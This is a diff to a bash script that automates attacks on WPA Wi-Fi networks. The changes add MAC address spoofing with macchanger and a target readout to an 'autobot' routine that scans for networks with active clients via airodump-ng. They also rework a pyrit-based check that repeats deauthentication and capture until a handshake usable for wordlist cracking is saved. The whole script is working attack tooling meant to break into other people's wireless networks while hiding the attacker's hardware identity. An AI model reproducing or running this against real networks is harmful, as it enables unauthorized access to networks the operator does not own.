@@ -15,13 +15,23 @@
 
 fautobot()																#Automagically find active clients and collect new handshakes
 {	
+	ifconfig mon0 down
+	macchanger -a mon0
+	ifconfig mon0 up
 	clear
-	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 -f 750 -a -w $HOME/tmp -o csv --encrypt WPA&
-	DONE=""
 	$COLOR 2;$COLOR2 1;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
 	echo
 	$COLOR 4;echo " [*] Scanning for active clients.. ";$COLOR 9
+	echo
+	$COLOR 1;echo " [>] EVALUATING TARGET: ";$COLOR 9
+	echo " [*] ESSID: $ESSID"
+	echo " [*] BSSID: $BSSID"
+	echo " [*] CLIENT: $CLIE"
+	echo " [*] CHANNEL: $CHAN"
+	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 -f 750 -a -w $HOME/tmp -o csv --encrypt WPA&
+	DONE=""
 	LNUM=0
+	sleep 5
 	while [ $DONE -z ] 2> /dev/null
 		do
 			sleep 0.3
@@ -37,6 +47,16 @@ fautobot()																#Automagically find active clients and collect new han
 			CHAN=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep WPA | cut -d ',' -f 4 | head -n 1)
 			CHAN=$((CHAN + 1 - 1))
 			CLIE=$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep "$BSSID" | cut -d ',' -f 1 | head -n 1)
+			clear
+			$COLOR 2;$COLOR2 1;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
+			echo
+			$COLOR 4;echo " [*] Scanning for active clients.. ";$COLOR 9
+			echo
+			$COLOR 1;echo " [>] EVALUATING TARGET: ";$COLOR 9
+			echo " [*] ESSID: $ESSID"
+			echo " [*] BSSID: $BSSID"
+			echo " [*] CLIENT: $CLIE"
+			echo " [*] CHANNEL: $CHAN"
 			if [ ${BSSID:2:1} = ":" ] 2> /dev/null
 				then
 					if [ $(cat $HOME/Desktop/cap/handshakes/got | grep $BSSID) -z ] 2> /dev/null
@@ -111,49 +131,49 @@ fautobot()																#Automagically find active clients and collect new han
 fanalyze()
 {
 	
-while [ $(echo $ISDONE | grep $BSSID) -z ] 2> /dev/null
-	do
-		sleep 0.5
-		ISDONE=$(pyrit -r $HOME/tmp1-01.cap analyze)
-		if  [ $(echo $ISDONE | grep "$ESSID") -z ] 2> /dev/null
-			then
-				A=1
-			else
-				break
-		fi
-	done
+	while [ $(echo $ISDONE | grep $BSSID) -z ] 2> /dev/null
+		do
+			sleep 0.5
+			ISDONE=$(pyrit -r $HOME/tmp1-01.cap analyze)
+			if  [ $(echo $ISDONE | grep "$ESSID") -z ] 2> /dev/null
+				then
+					A=1
+				else
+					break
+			fi
+		done
 
-while [ $DONE2 -z ] 2> /dev/null
-	do
-		echo "$ISDONE" > $HOME/tmp4
-		if  [ $(echo $ISDONE | grep "$ESSID") -z ] 2> /dev/null
-			then
-				A=1
-			else
-				DONE2=1
-		fi
-		if [ $( cat $HOME/tmp4 | grep "bad") -z ] 2> /dev/null
-			then
-				A=1
-			else
-				DONE2=1
-		fi
-		
-		if [ $( cat $HOME/tmp4 | grep "workable") -z ] 2> /dev/null
-			then
-				A=1
-			else
-				DONE2=1
-				GDONE=1
-		fi
-		if [ $( cat $HOME/tmp4 | grep "good") -z ] 2> /dev/null
-			then
-				A=1
-			else
-				DONE2=1
-				GDONE=1
-		fi
-	done
+	while [ $DONE2 -z ] 2> /dev/null
+		do
+			echo "$ISDONE" > $HOME/tmp4
+			if  [ $(echo $ISDONE | grep "$ESSID") -z ] 2> /dev/null
+				then
+					A=1
+				else
+					DONE2=1
+			fi
+			if [ $( cat $HOME/tmp4 | grep "bad") -z ] 2> /dev/null
+				then
+					A=1
+				else
+					DONE2=1
+			fi
+			
+			if [ $( cat $HOME/tmp4 | grep "workable") -z ] 2> /dev/null
+				then
+					A=1
+				else
+					DONE2=1
+					GDONE=1
+			fi
+			if [ $( cat $HOME/tmp4 | grep "good") -z ] 2> /dev/null
+				then
+					A=1
+				else
+					DONE2=1
+					GDONE=1
+			fi
+		done
 	
 	
 }
@@ -301,11 +321,17 @@ fcap()																	#Deauth, capture and strip handshakes
 			echo
 			sleep 3
 			$COLOR 4;echo " [*] Analyzing pcap for handshake [*] ";$COLOR 9
-			sleep 2
-			DONE=$(pyrit -r $HOME/tmp1-01.cap analyze | grep good)
+			sleep 3
+			fanalyze
+			if [ $GDONE -z ]
+				then
+					DONE=""
+				else
+					DONE=1
+			fi
 			sleep 0.5
 		done
-		
+	GDONE=""
 	$COLOR 2;echo " [*] Handshake capture successful! "; $COLOR 9
 	killall airodump-ng
 	clear
@@ -320,9 +346,6 @@ fcap()																	#Deauth, capture and strip handshakes
 	rm -rf $HOME/tmp*
 	clear
 	$COLOR 2;echo " [*] Handshake capture was successful!, Horray for you ";$COLOR 9
-	echo
-	$COLOR 4;echo $DONE;$COLOR 9
-	echo
 	$COLOR 2;echo " [*] Handshake saved to $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap "";$COLOR 9
 	if [ $WORDLIST -z ] 2> /dev/null
 		then
